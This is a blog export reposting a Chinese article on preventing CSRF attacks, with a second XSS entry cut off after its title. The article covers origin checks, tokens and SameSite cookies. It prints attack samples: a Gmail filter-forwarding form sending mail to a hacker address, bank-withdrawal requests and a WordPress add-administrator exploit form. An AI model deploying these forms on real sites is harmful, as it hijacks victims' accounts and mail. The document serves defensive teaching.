<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[前端安全系列（二）：如何防止CSRF攻击？]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[转载自美团技术团队，作者刘烨，原文链接：https://tech.meituan.com/2018/10/11/fe-security-csrf.html 背景随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 前端安全近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端同学在日常开发中不断预防和修复安全漏洞。本文是该系列的第二篇。 今天我们讲解一下 CSRF，其实相比XSS，CSRF的名气似乎并不是那么大，很多人都认为“CSRF不具备那么大的破坏性”。真的是这样吗？接下来，我们还是有请小明同学再次“闪亮”登场。 CSRF攻击CSRF漏洞的发生相比XSS，CSRF的名气似乎并不是那么大，很多人都认为CSRF“不那么有破坏性”。真的是这样吗？ 接下来有请小明出场~~ 小明的悲惨遭遇这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意： 甩卖比特币，一个只要998！！ 聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生…… 在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到hacker@hackermail.com。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。 不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。 小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码： 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。 小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。 黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。 小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了…… 以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞： https://www.davidairey.com/google-Gmail-security-hijack/ 当然，目前此漏洞已被Gmail修复，请使用Gmail的同学不要慌张。 什么是CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 一个典型的CSRF攻击有着如下的流程： 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。 a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 a.com以受害者的名义执行了act=xx。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。 几种常见的攻击类型GET类型的CSRF GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用： 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) 在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。 POST类型的CSRF 这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如： 123456 &lt;form action="http://bank.example/withdraw" method=POST&gt; &lt;input type="hidden" name="account" value="xiaoming" /&gt; &lt;input type="hidden" name="amount" value="10000" /&gt; &lt;input type="hidden" name="for" value="hacker" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。 链接类型的CSRF 链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如： 123&lt;a href="http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker" taget="_blank"&gt;重磅消息！！&lt;a/&gt; 由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。 CSRF的特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。 防护策略CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。 上文中讲了CSRF的两个特点： CSRF（通常）发生在第三方域名。 CSRF攻击者不能获取到Cookie等信息，只是使用。 针对这两点，我们可以专门制定防护策略，如下： 阻止不明外域的访问 同源检测 Samesite Cookie 提交时要求附加本域才能获取的信息 CSRF Token 双重Cookie验证 以下我们对各种防护方法做详细说明。 同源检测既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。 那么问题来了，我们如何判断请求是否来自外域呢？ 在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名： Origin Header Referer Header 这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。 使用Origin Header确定来源域名在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。 如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。 但是Origin在以下两种情况下并不存在： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考MDN Same-origin_policy#IE_Exceptions 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 使用Referer Header确定来源域名根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。 2014年，W3C的Web应用安全工作组发布了Referrer Policy草案，对浏览器该如何发送Referer做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，我们终于可以灵活地控制自己网站的Referer策略了。新版的Referrer Policy规定了五种Referer策略：No Referrer、No Referrer When Downgrade、Origin Only、Origin When Cross-origin、和 Unsafe URL。之前就存在的三种策略：never、default和always，在新标准里换了个名称。他们的对应关系如下： 策略名称 属性值（新） 属性值（旧） No Referrer no-Referrer never No Referrer When Downgrade no-Referrer-when-downgrade default Origin Only (same or strict) origin origin Origin When Cross Origin (strict) origin-when-crossorigin - Unsafe URL unsafe-url always 根据上面的表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer。例如：aaa.com引用bbb.com的资源，不会发送Referer。 设置Referrer Policy的方法有三种： 在CSP设置 页面头部增加meta标签 a标签增加referrerpolicy属性 上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏Referer。如果攻击者将自己的请求这样填写： 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) 那么这个请求发起的攻击将不携带Referer。 另外在以下情况下Referer没有或者不可信： IE6、7下使用window.location.href=url进行界面的跳转，会丢失Referer。 IE6、7下使用window.open，也会缺失Referer。 HTTPS页面跳转到HTTP页面，所有浏览器Referer都丢失。 点击Flash上到达另外一个网站的时候，Referer的情况就比较杂乱，不太可信。 无法确认来源域名情况当Origin和Referer头文件不存在时该怎么办？如果Origin和Referer都不存在，建议直接进行阻止，特别是如果您没有使用随机CSRF Token（参考下方）作为第二次检查。 如何阻止外域请求通过Header的验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。 我们已经知道了请求域名是否是来自不可信的域名，我们直接阻止掉这些的请求，就能防御CSRF攻击了吗？ 且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似CSRF攻击。所以在判断的时候需要过滤掉页面请求情况，通常Header符合以下情况： 12Accept: text/htmlMethod: GET 但相应的，页面请求就暴露在了CSRF的攻击范围之中。如果你的网站中，在页面的GET请求中对当前用户做了什么操作的话，防范就失效了。 例如，下面的页面请求： 1GET https://example.com/addComment?comment=XXX&amp;dest=orderId 注：这种严格来说并不一定存在CSRF攻击的风险，但仍然有很多网站经常把主文档GET请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。 另外，前面说过，CSRF大多数情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。 综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的CSRF攻击。但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。 CSRF Token前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。 而CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。 原理CSRF Token的防护策略分为三个步骤： 1. 将CSRF Token输出到页面中 首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。 2. 页面提交的请求携带这个Token 对于GET请求，Token将附在请求地址之后，这样URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上： 1&lt;input type=”hidden” name=”csrftoken” value=”tokenvalue”/&gt; 这样，就把Token以参数的形式加入请求了。 3. 服务器验证Token是否正确 当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。 这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。 下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下： 1234567891011121314151617181920212223HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // 从 session 中得到 csrftoken 属性String sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null)&#123; // 产生新的 token 放入 session 中 sToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); &#125; else&#123; // 从 HTTP 头中取得 csrftoken String xhrToken = req.getHeader(“csrftoken”); // 从请求参数中取得 csrftoken String pToken = req.getParameter(“csrftoken”); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; chain.doFilter(request, response); &#125;else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); &#125; &#125; 代码源自IBM developerworks CSRF 这个Token的值必须是随机生成的，这样它就不会被攻击者猜到，考虑利用Java应用程序的java.security.SecureRandom类来生成足够长的随机标记，替代生成算法包括使用256位BASE64编码哈希，选择这种生成算法的开发人员必须确保在散列数据中使用随机性和唯一性来生成随机标识。通常，开发人员只需为当前会话生成一次Token。在初始生成此Token之后，该值将存储在会话中，并用于每个后续请求，直到会话过期。当最终用户发出请求时，服务器端必须验证请求中Token的存在性和有效性，与会话中找到的Token相比较。如果在请求中找不到Token，或者提供的值与会话中的值不匹配，则应中止请求，应重置Token并将事件记录为正在进行的潜在CSRF攻击。 分布式校验在大型网站中，使用Session存储CSRF Token会带来很大的压力。访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过像Ngnix之类的负载均衡器之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。 由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题，目前很多网站采用Encrypted Token Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。 这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。 在token解密成功之后，服务器可以访问解析值，Token中包含的UserID和时间戳将会被拿来被验证有效性，将UserID与当前登录的UserID进行比较，并将时间戳与当前时间进行比较。 总结Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。 但是此方法的实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。 验证码和密码其实也可以起到CSRF Token的作用哦，而且更安全。 为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？ 双重Cookie验证在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。 那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。 双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。 当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。 由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况： 如果用户访问的网站为www.a.com，而后端的api域名为api.a.com。那么在www.a.com下，前端拿不到api.a.com的Cookie，也就无法完成双重Cookie认证。 于是这个认证Cookie必须被种在a.com下，这样每个子域都可以访问。 任何一个子域都可以修改a.com下的Cookie。 某个子域名存在漏洞被XSS攻击（例如upload.a.com）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了a.com下的Cookie。 攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向www.a.com下，发起CSRF攻击。 总结：用双重Cookie防御CSRF的优点： 无需使用Session，适用面更广，易于实施。 Token储存于客户端中，不会给服务器带来压力。 相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。 缺点： Cookie中增加了额外的字段。 如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。 难以做到子域名的隔离。 为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。 Samesite Cookie属性防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： Samesite=Strict这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 Samesite=Lax这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下： 123456789private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) &#123; //生成token String sToken = this.generateToken(); //手动添加Cookie实现支持“Samesite=strict” //Cookie添加双重验证 String CookieSpec = String.format("%s=%s; Path=%s; HttpOnly; Samesite=Strict", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader("Set-Cookie", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); &#125; 代码源自OWASP Cross-Site_Request_Forgery #Implementation example 我们应该如何使用SamesiteCookie如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。 但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。 如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。 另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。 而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。 总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。 防止网站被利用前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF的攻击可以来自： 攻击者自己的网站。 有文件上传漏洞的网站。 第三方论坛等用户内容。 被攻击网站自己的评论功能等。 对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？ 严格管理所有的上传接口，防止任何预期之外的上传内容（例如HTML）。 添加Header X-Content-Type-Options: nosniff 防止黑客上传HTML内容的资源（例如图片）被解析为网页。 对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。 当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）。 CSRF其他防范措施对于一线的程序员同学，我们可以通过各种防护策略来防御CSRF，对于QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？ CSRF测试CSRFTester是一款CSRF漏洞的测试工具，CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 CSRFTester使用方法大致分下面几个步骤： 步骤1：设置浏览器代理 CSRFTester默认使用Localhost上的端口8008作为其代理，如果代理配置成功，CSRFTester将为您的浏览器生成的所有后续HTTP请求生成调试消息。 步骤2：使用合法账户访问网站开始测试 我们需要找到一个我们想要为CSRF测试的特定业务Web页面。找到此页面后，选择CSRFTester中的“开始录制”按钮并执行业务功能；完成后，点击CSRFTester中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。 步骤3：通过CSRF修改并伪造请求 之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有GET或者POST请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改query和form的参数。当修改完所有我们希望诱导用户form最终的提交值，可以选择开始生成HTML报告。 步骤4：拿到结果如有漏洞进行修复 首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有5种可能的报告：表单、iFrame、IMG、XHR和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。 CSRF监控对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了CSRF防护措施是很可能的。 一旦发生了CSRF攻击，我们如何及时的发现这些攻击呢？ CSRF攻击有着比较明显的特征： 跨域请求。 GET类型请求Header的MIME类型大概率为图片，而实际返回Header的MIME类型为Text、JSON、HTML。 我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有CSRF攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review其CSRF防护策略。 个人用户CSRF安全的建议经常上网的个人用户，可以采用以下方法来保护自己： 使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。 尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。 总结简单总结一下上文的防护策略： CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。 CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。 保证页面的幂等性，后端接口不要在GET页面中做用户操作。 为了更好的防御CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前Web应用程序自身的情况做合适的选择，才能更好的预防CSRF的发生。 历史案例WordPress的CSRF漏洞2012年3月份，WordPress发现了一个CSRF漏洞，影响了WordPress 3.3.1版本，WordPress是众所周知的博客平台，该漏洞可以允许攻击者修改某个Post的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下: Add Admin/User Delete Admin/User Approve comment Unapprove comment Delete comment Change background image Insert custom header image Change site title Change administrator’s email Change Wordpress Address Change Site Address 那么这个漏洞实际上就是攻击者引导用户先进入目标的WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的码如下： 12345678910111213141516171819&lt;html&gt; &lt;body onload="javascript:document.forms[0].submit()"&gt; &lt;H2&gt;CSRF Exploit to add Administrator&lt;/H2&gt; &lt;form method="POST" name="form0" action="http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php"&gt; &lt;input type="hidden" name="action" value="createuser"/&gt; &lt;input type="hidden" name="_wpnonce_create-user" value="&lt;sniffed_value&gt;"/&gt; &lt;input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/&gt; &lt;input type="hidden" name="user_login" value="admin2"/&gt; &lt;input type="hidden" name="email" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="first_name" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="last_name" value=""/&gt; &lt;input type="hidden" name="url" value=""/&gt; &lt;input type="hidden" name="pass1" value="password"/&gt; &lt;input type="hidden" name="pass2" value="password"/&gt; &lt;input type="hidden" name="role" value="administrator"/&gt; &lt;input type="hidden" name="createuser" value="Add+New+User+"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; YouTube的CSRF漏洞2008年，有安全研究人员发现，YouTube上几乎所有用户可以操作的动作都存在CSRF漏洞。如果攻击者已经将视频添加到用户的“Favorites”，那么他就能将他自己添加到用户的“Friend”或者“Family”列表，以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。例如，要把视频添加到用户的“Favorites”，攻击者只需在任何站点上嵌入如下所示的IMG标签： 12&lt;img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite"/&gt; 攻击者也许已经利用了该漏洞来提高视频的流行度。例如，将一个视频添加到足够多用户的“Favorites”，YouTube就会把该视频作为“Top Favorites”来显示。除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为“不宜的”，从而导致YouTube删除该视频。 这些攻击还可能已被用于侵犯用户隐私。YouTube允许用户只让朋友或亲属观看某些视频。这些攻击会导致攻击者将其添加为一个用户的“Friend”或“Family”列表，这样他们就能够访问所有原本只限于好友和亲属表中的用户观看的私人的视频。 攻击者还可以通过用户的所有联系人名单（“Friends”、“Family”等等）来共享一个视频，“共享”就意味着发送一个视频的链接给他们，当然还可以选择附加消息。这条消息中的链接已经并不是真正意义上的视频链接，而是一个具有攻击性的网站链接，用户很有可能会点击这个链接，这便使得该种攻击能够进行病毒式的传播。 参考文献 Mozilla wiki.Security-Origin OWASP.Cross-Site_RequestForgery(CSRF)_Prevention_Cheat_Sheet. Gmail Security Hijack Case.Google-Gmail-Security-Hijack. Netsparker Blog.Same-Site-Cookie-Attribute-Prevent-Cross-site-Request-Forgery MDN.Same-origin_policy#IE_Exceptions]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端安全系列（一）：如何防止XSS攻击？]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB%2F</url>
